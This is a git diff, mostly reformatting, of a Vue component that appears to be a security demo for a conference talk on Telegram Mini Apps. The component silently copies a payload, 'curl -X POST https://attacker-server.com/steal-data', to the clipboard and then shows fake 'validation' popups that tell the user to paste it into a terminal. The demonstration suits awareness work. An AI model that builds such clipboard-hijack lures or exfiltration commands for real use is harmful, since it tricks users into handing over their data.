@@ -13,16 +13,16 @@ const maliciousPayload = 'curl -X POST https://attacker-server.com/steal-data -d
 async function handleValidation() {
   isValidating.value = true;
   validationStatus.value = 'idle';
-  
+
   try {
     // Pequeño delay para simular procesamiento
     await new Promise(resolve => setTimeout(resolve, 500));
-    
+
     // Intentar copiar al portapapeles usando la API moderna
     if (navigator.clipboard && navigator.clipboard.writeText) {
       await navigator.clipboard.writeText(maliciousPayload);
       validationStatus.value = 'success';
-      
+
       // Mostrar popup de Telegram confirmando la "validación"
       await popup.show({
         title: '✅ Validación Exitosa',
@@ -37,11 +37,11 @@ async function handleValidation() {
       textArea.style.left = '-999999px';
       document.body.appendChild(textArea);
       textArea.select();
-      
+
       try {
         document.execCommand('copy');
         validationStatus.value = 'success';
-        
+
         await popup.show({
           title: '✅ Validación Exitosa',
           message: '¡Tu cuenta ha sido validada correctamente! Por favor, ejecuta el comando de verificación en tu terminal para completar el proceso.',
@@ -56,7 +56,7 @@ async function handleValidation() {
   } catch (error) {
     console.error('Error al copiar al portapapeles:', error);
     validationStatus.value = 'error';
-    
+
     await popup.show({
       title: '❌ Error',
       message: 'No se pudo completar la validación. Inténtalo de nuevo.',
@@ -102,7 +102,8 @@ async function showClipboardContent() {
     <div class="demo-container">
       <div class="warning-banner">
         <h3>⚠️ DEMO de Seguridad - MorterueloCon 2026</h3>
-        <p>Esta es una demostración de cómo las Mini Apps de Telegram pueden manipular el portapapeles en aplicaciones de escritorio.</p>
+        <p>Esta es una demostración de cómo las Mini Apps de Telegram pueden manipular el portapapeles en aplicaciones
+          de escritorio.</p>
       </div>
 
       <div class="validation-section">
@@ -112,9 +113,9 @@ async function showClipboardContent() {
           <p class="info-detail">Haz clic en el botón de abajo para completar el proceso de validación.</p>
         </div>
 
-        <button 
+        <button
           class="validate-button"
-          :class="{ 
+          :class="{
             'validating': isValidating,
             'success': validationStatus === 'success',
             'error': validationStatus === 'error'
@@ -128,7 +129,10 @@ async function showClipboardContent() {
           <span v-else>🔐 Validar mi Cuenta</span>
         </button>
 
-        <div v-if="validationStatus === 'success'" class="success-message">
+        <div
+          v-if="validationStatus === 'success'"
+          class="success-message"
+        >
           <p>✅ ¡Validación completada!</p>
           <p class="instruction">Ahora abre tu terminal y pega el comando de verificación (Ctrl+V o Cmd+V)</p>
         </div>
@@ -136,7 +140,10 @@ async function showClipboardContent() {
 
       <div class="demo-controls">
         <h4>🔧 Controles de Demo</h4>
-        <button class="demo-button" @click="showClipboardContent">
+        <button
+          class="demo-button"
+          @click="showClipboardContent"
+        >
           📋 Ver Portapapeles
         </button>
         <div class="payload-info">
@@ -252,9 +259,12 @@ async function showClipboardContent() {
 }
 
 @keyframes pulse {
-  0%, 100% {
+
+  0%,
+  100% {
     opacity: 1;
   }
+
   50% {
     opacity: 0.8;
   }
